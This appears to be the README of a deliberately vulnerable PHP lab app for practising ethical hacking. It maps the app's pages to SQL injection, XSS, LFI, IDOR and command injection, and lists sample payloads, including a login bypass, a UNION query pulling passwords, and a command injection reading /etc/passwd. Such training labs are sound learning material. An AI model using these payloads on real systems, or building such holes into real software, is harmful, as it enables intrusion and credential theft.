# 🔐 The Bag VulnBox – Hacker Edition v3

A professional-grade, multi-vulnerability web application for learning ethical hacking.

## 🧪 Goals

1. Perform SQL injection to bypass login.
2. Inject XSS into comment/search boxes.
3. Exploit LFI via `view.php`.
4. Use IDOR to access other users' profiles.
5. Run system commands via `debug.php`.

## 🧰 Setup Instructions

1. Import `db/database.sql` into MySQL.
2. Run a local server (e.g., XAMPP, WAMP, or PHP built-in).
3. Open `index.php` in browser.

## 🧪 Attack Vectors

| Page | Vulnerability |
|------|---------------|
| login.php | SQL Injection |
| search.php | SQLi + XSS |
| profile.php | SQLi + IDOR |
| comment.php | Stored XSS |
| view.php | LFI |
| debug.php | Command Injection |

## 🧪 Suggested Payloads

### SQL Injection
- `' OR 1=1-- -
- `admin' -- 
- `' UNION SELECT null, username, password FROM users-- 

### XSS
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`

### LFI
- `view.php?page=../../logs/passwords.txt`

### Command Injection
- `?cmd=id`
- `?cmd=cat /etc/passwd`